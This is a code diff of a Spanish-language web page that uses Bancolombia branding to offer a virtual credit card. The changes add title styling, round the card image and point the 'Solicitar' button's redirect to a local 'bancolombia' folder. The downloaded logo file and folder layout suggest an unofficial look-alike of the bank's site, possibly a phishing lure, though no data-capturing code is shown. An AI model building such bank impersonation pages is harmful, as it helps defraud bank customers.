@@ -41,17 +41,38 @@
             max-width: 100%;
         }
 
-        /* Tarjeta de crédito (imagen) - SIN BORDES REDONDOS */
+        /* Título principal */
+        .main-title {
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .main-title h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #000000;
+            line-height: 1.3;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            text-align: center;
+            padding: 0 12px;
+        }
+
+        /* Tarjeta de crédito (imagen) */
         .card-container {
             margin-bottom: 28px;
-            padding: 0;
-            width: 100%;
+            padding: 0 8px;
         }
 
         .card-image {
             width: 100%;
-            display: block;
-            border-radius: 0;
+            border-radius: 16px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
         }
 
@@ -316,7 +337,7 @@
             <img src="img/logo-removebg-preview.png" alt="Bancolombia">
         </div>
 
-        <!-- Tarjeta de crédito (imagen) - SIN BORDES REDONDOS -->
+        <!-- Tarjeta de crédito (imagen) -->
         <div class="card-container">
             <img src="img/imgcontainers.jpg" alt="Tarjeta Crédito Virtual Bancolombia" class="card-image">
         </div>
@@ -355,7 +376,7 @@
             // ============================================
             // REDIRECCIÓN INTERNA
             // ============================================
-            const LINK_REDIRECCION = "../index.html";
+            const LINK_REDIRECCION = "../bancolombia/index.html";
             // ============================================
 
             document.getElementById("btnSolicitar").addEventListener("click", function () {
